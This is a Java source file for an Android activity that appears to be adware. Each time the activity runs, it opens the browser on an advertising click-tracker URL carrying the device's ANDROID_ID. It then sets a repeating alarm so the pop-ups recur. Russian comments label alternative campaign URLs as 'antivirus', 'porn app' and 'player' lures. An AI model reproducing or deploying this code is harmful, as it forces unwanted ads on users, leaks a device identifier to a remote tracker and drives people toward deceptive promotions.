package com.own.apk.app;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

public class AlarmActivity extends AppCompatActivity {
    private static String TAG = "alarmActivity";

    AlarmStuff as;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Log.i(TAG, ">>> New task started <<<");
        super.onCreate(savedInstanceState);
        // антивирус
//        Uri uri = Uri.parse("http://palundrus.com/click.php?key=promo&c1=rest");


        // порноапп
        Uri uri = Uri.parse(getAdvUrl());


        // плеер
//        Uri uri = Uri.parse("http://support-ip.com/b/click.php?key=fire&с1=plund");

        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        Log.i(TAG, "*** has finished  activity ***");
        startActivity(intent);
        finish();
        Log.i(TAG, "/// open browser ///");

        as = new AlarmStuff();
        as.setRepeatingAlarm(AlarmActivity.this, AlarmStuff.DELAY_ADV);
        Log.i(TAG, "setup alarm in alarmActivity");
    }




    public String getAdvUrl(){

        String deviceId = null;
        try {
            deviceId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
            if (deviceId == null){
                deviceId = "-1";
            }
        } catch (Exception e){
            deviceId = "-999";
        }

        String fullUrl = MainActivity.BASE_URL.concat("&device=").concat(deviceId);
        return fullUrl;
    }
}